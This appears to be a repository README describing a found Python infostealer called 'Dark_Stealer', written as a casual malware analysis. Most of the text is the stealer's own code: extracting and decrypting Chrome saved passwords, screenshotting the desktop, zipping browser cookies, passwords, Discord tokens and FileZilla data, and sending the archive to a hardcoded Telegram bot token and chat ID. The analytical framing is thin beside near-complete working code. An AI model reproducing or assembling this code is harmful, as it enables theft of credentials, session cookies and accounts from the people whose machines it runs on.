# Dark_Stealer-V1.0-
While browsing the interent I found this unmarked python file packed away into a seperate folder trying to hides itself as a trojan. I looked into it and found exactly what it was aiming to do. The code is aiming to grab the users disocrd token and save it to the folder. The main executable likely sent the working discord tokens, cookies, and screenshots back to the owner of the malware. I found this all incredibly interesting so I decided to publish it all for you to see. It also seems to be posting to telegram as far as I can tell from the token included.

## Analysis
```python
username = os.getlogin()
token = '756172703:AAHyXD5Tii9J-JBl98-mAGGJxeTKKvSJG2s'
bot = telebot.TeleBot(token)
```
This code snippet is the malwares form of communicating VIA telegram after its scraped all of your data. Whats so nasty about this though is how much data it scrapes.
```python
def Chrome():
    text = 'Stealer coded by Dark $ide\n\n\nPasswords Chrome:' + '\n'
    text += 'URL | LOGIN | PASSWORD' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                text += url + ' | ' + login + ' | ' + password + '\n'
    return text
file = open(os.getenv("APPDATA") + '\\google_pass.txt', "w+")
file.write(str(Chrome()) + '\n')
file.close()
```
The following code as show above is it goes through all of the biggest browsers and grabs every shred of data it can for your discord account and stores it in a text file. It proceeds to do that for the following websites: Chrome, Yandex, Firefox, Chromium, Amigo, Opera, and even Firezilla. It proceeds to also save the cookies and discord token to a text file. For all of those browsers.
```python
screen = ImageGrab.grab()
screen.save(os.getenv("APPDATA") + '\\sreenshot.jpg')
```
Here is the scaries two lines of code in this malware sample. The malware itself takes a photo of your screen and saves it to the data anyalsis. 
```python
zname=r'D:\LOG.zip' 
newzip=zipfile.ZipFile(zname,'w') 
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\google_pass.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\google_cookies.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\yandex_cookies.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\chromium.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\chromium_cookies.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\amigo_pass.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\amigo_cookies.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\opera_pass.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\opera_cookies.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\discord_token.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\filezilla.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\sreenshot.jpg')
newzip.close() 

doc = 'D:\LOG.zip'

bot.send_document(439184350, doc)
```
This final snippet of code just tells it to grab everything its just got and to zip and send the file over via telegram. 
### Concluison
This is a scary piece of malware, it may be the future trends of malware not to aim for destruction such as something like wannacrypt or with simple qbots, but instead the mass amounts of data logged and sold on illegal markets. This simple 100+ lines of code tell it to not only steal your cookies, passwords, filezilla information, discord token, but to also take a screenshot.
## TOS
I did not create this, in fact I dont know who created it. I merely found it while treasure hunting on the internet. Please do use this responsibly and don't abuse. This is all meant for educational purposes and if you use this you are breaking the law. Please keep this in mind feel free to email me. Also I would highly suggest not running it since it still contains the token. 


